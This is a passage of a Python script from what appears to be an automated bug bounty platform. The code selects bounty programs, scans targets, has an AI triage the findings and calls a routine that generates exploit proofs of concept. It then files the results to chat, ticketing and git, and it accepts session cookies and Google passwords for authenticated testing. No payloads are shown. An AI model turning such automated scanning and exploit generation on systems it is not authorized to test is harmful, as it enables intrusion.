        if new_programs:
            log(f"[*] 🚨 FOUND {len(new_programs)} NEW BUG BOUNTY PROGRAMS 🚨")
            for np in new_programs:
                send_discord(f"🚨 **NEW BUG BOUNTY PROGRAM DETECTED** 🚨\nProgram: `{np}`\nPrioritizing full reconnaissance immediately to get first-blood!")
            
            # Save updated known list
            known_programs_file.write_text(json.dumps(list(current_programs)))
            
            # Force the new programs into the scan list
            keys_to_scan = list(new_programs)
            # Fill the rest of the 10 slots with random old programs
            if len(keys_to_scan) < 10:
                remaining_slots = 10 - len(keys_to_scan)
                old_programs = list(current_programs - new_programs)
                keys_to_scan.extend(random.sample(old_programs, min(remaining_slots, len(old_programs))))
        else:
            # Save updated known list for the very first run
            known_programs_file.write_text(json.dumps(list(current_programs)))
            # Randomly select 10 programs
            keys_to_scan = random.sample(list(targets.keys()), min(10, len(targets)))
            
        targets = {k: targets[k] for k in keys_to_scan}
        log(f"[*] Dynamically selected {len(targets)} bounty programs for this cycle")
    else:
        targets = load_targets()
        
    out = RESULTS_DIR / "latest_fast_scan.json"
    previous_scan = []
    if out.exists():
        try: previous_scan = json.loads(out.read_text())
        except: pass
    previous_sigs = {f"{x.get('type')}_{x.get('url')}" for x in previous_scan}
        
    all_findings = []
    for handle, target_data in targets.items():
        all_findings.extend(scan_target_fast(handle, target_data, args))
        
    new_count = 0
    verified_count = 0
    triaged_count = 0
    dropped_by_triage = 0
    valid_findings = []
    needs_review_findings = []
    
    try:
        exclusions = json.loads((DATA_DIR / "scope_exclusions.json").read_text())
    except Exception:
        exclusions = {"global_exclusions": [], "programs": {}}

    duplicate_risk_map = {
        "CORS_REFLECTION": "VERY HIGH",
        "SUBDOMAIN_TAKEOVER": "HIGH",
        "GIT_EXPOSURE": "HIGH",
        "HOST_HEADER_INJECTION": "MEDIUM",
        "IDOR": "LOW",
        "BUSINESS_LOGIC": "VERY LOW"
    }

    verified_findings = []
    needs_review_findings = []
    noise_findings = []
    
    for f in all_findings:
        sig = f"{f.get('type')}_{f.get('url')}"
        if sig not in previous_sigs:
            new_count += 1
            f["estimated_duplicate_risk"] = duplicate_risk_map.get(f.get("type"), "MEDIUM")
            f["confidence_score"] = 50 # Default 0-100 score
            
            # Scope check
            prog = f.get("program", "unknown")
            ex_list = exclusions.get("global_exclusions", []) + exclusions.get("programs", {}).get(prog, [])
            if f.get("type") in ex_list:
                f["scope_verified"] = False
                f["verify_scope_before_submitting"] = True
            else:
                f["scope_verified"] = True

            # === Feature 1: AI Triage (before PoC generation) ===
            if FEATURES_LOADED and GEMINI_API_KEY and "your_" not in GEMINI_API_KEY:
                if f.get("severity") in ["MEDIUM", "HIGH", "CRITICAL"]:
                    try:
                        triage = ai_triage_finding(f, GEMINI_API_KEY)
                        triaged_count += 1
                        f["ai_triage"] = triage

                        if triage.get("verdict") == "FALSE_POSITIVE" and triage.get("confidence", 0) >= 0.7:
                            log(f"[*] 🗑️ AI Triage: Dropping {f.get('type')} — {triage.get('reasoning', '')[:80]}")
                            dropped_by_triage += 1
                            f["confidence_score"] = 10
                            noise_findings.append(f)
                            continue

                        # Adjust severity if AI recommends
                        if triage.get("severity_adjust"):
                            old_sev = f.get("severity")
                            f["severity"] = triage["severity_adjust"]
                            log(f"  [AI Triage] Severity adjusted: {old_sev} → {f['severity']}")

                        # Boost confidence if AI confirms
                        if triage.get("verdict") == "TRUE_POSITIVE":
                            f["confidence_score"] = int(triage.get("confidence", 0.8) * 100)
                            f["ai_confirmed"] = True
                    except Exception as e:
                        pass
                    time.sleep(0.5)  # Rate limit Gemini calls

            # AI exploit + proof (only for HIGH/MEDIUM confidence, MEDIUM/HIGH/CRITICAL severity)
            if f.get("confidence_score") >= 50 and f.get("severity") in ["MEDIUM", "HIGH", "CRITICAL"]:
                proof = ai_exploit_and_prove(f)
                if proof and proof.get("verified"):
                    verified_count += 1
                    f["confidence_score"] = 100

            # --- STRICT ZERO-TRUST AI FILTER ---
            # Readiness check
            reasons = []
            if not f.get("scope_verified"): reasons.append("Excluded by scope")
            if f.get("type") == "CORS_REFLECTION" and "Credentials" not in str(f.get("detail", "")): reasons.append("CORS without credentials")
            if not f.get("verified"): reasons.append("No exploit PoC")
            
            if not reasons:
                f["status"] = "READY_TO_REPORT"
                f["requires_manual_verification"] = False
            else:
                f["status"] = "NEEDS_MANUAL_REVIEW"
                f["readiness_reasons"] = reasons
                f["requires_manual_verification"] = True

            if f.get("severity") in ["MEDIUM", "HIGH", "CRITICAL"]:
                triage_verdict = f.get("ai_triage", {}).get("verdict")
                
                if f.get("verified") is not True and triage_verdict != "TRUE_POSITIVE":
                    log(f"[*] 🛡️ STRICT AI FILTER: Dropping unverified {f.get('type')} on {f.get('url')} to prevent false positives.")
                    needs_review_findings.append(f)
                    continue
                
                # If it survived the strict filter, it is a HIGH-CONFIDENCE REAL BUG!
                if f.get("estimated_duplicate_risk") in ["VERY HIGH", "HIGH"]:
                    log(f"⚠️ WARNING: {f.get('type')} has {f.get('estimated_duplicate_risk')} duplicate risk. Verify before submitting!")
                
                send_discord_webhook(f)
                send_telegram_alert(f)
                send_slack_webhook(f)
                generate_ai_report(f)
                create_notion_ticket(f)
                create_defectdojo_finding(f)
                create_jira_ticket(f)
                prior_reports = push_to_graph(f)
                if prior_reports > 0:
                    f["estimated_duplicate_risk"] = "VERY HIGH"
                    log(f"⚠️ HIGH DUPLICATE RISK: {prior_reports} prior {f.get('type')} reports found in Neo4j for {f.get('program')}!")
                    
                generate_nuclei_template(f)
                verified_findings.append(f)
            else:
                # INFO/LOW severity
                noise_findings.append(f)
        else:
            # Already seen
            pass

    # Sorting verified findings by confidence and inverse of duplicate risk
    risk_weights = {"VERY HIGH": 1, "HIGH": 2, "MEDIUM": 3, "LOW": 4, "VERY LOW": 5}
    verified_findings.sort(key=lambda x: x.get("confidence_score", 0) * risk_weights.get(x.get("estimated_duplicate_risk"), 3), reverse=True)

    if verified_findings:
        (RESULTS_DIR / "verified_findings.json").write_text(json.dumps(verified_findings, indent=2))
    if needs_review_findings:
        (RESULTS_DIR / "needs_review.json").write_text(json.dumps(needs_review_findings, indent=2))
    if noise_findings:
        (RESULTS_DIR / "noise.json").write_text(json.dumps(noise_findings, indent=2))
        
    log(f"Finished! {new_count} NEW, {verified_count} AI-VERIFIED, {triaged_count} AI-TRIAGED "
        f"({dropped_by_triage} false positives dropped). Saved to {RESULTS_DIR}")
    backup_artifacts_to_git()

def backup_artifacts_to_git():
    if not GITHUB_BACKUP_REPO: return
    log("[*] Backing up AI-generated Zero-Day PoCs to Git...")
    try:
        import subprocess
        subprocess.run(["git", "add", "reports/poc/", "custom-templates/"], capture_output=True)
        subprocess.run(["git", "commit", "-m", "Auto-backup of AI-generated artifacts"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
    except: pass

if __name__ == "__main__":
    import argparse
    from scanners.utils import set_auth_context
    
    parser = argparse.ArgumentParser(description="Aegis-Auto Bug Bounty Platform")
    parser.add_argument("--dynamic", action="store_true", help="Dynamically select targets")
    parser.add_argument("--cookie", type=str, help="Session cookie for authenticated scanning")
    parser.add_argument("--bearer", type=str, help="Bearer token for authenticated scanning")
    parser.add_argument("--google-sso-emails", type=str, help="Comma separated list of two Google emails for IDOR testing")
    parser.add_argument("--google-sso-passes", type=str, help="Comma separated list of two Google passwords for IDOR testing")
    
    args, unknown = parser.parse_known_args()
    
    if args.cookie or args.bearer:
        set_auth_context(cookie=args.cookie, bearer=args.bearer)
        print(f"[*] Authenticated Scan Mode ENABLED.")
        if args.cookie: print(f"    - Cookie injected")
        if args.bearer: print(f"    - Bearer injected")
        
    main()
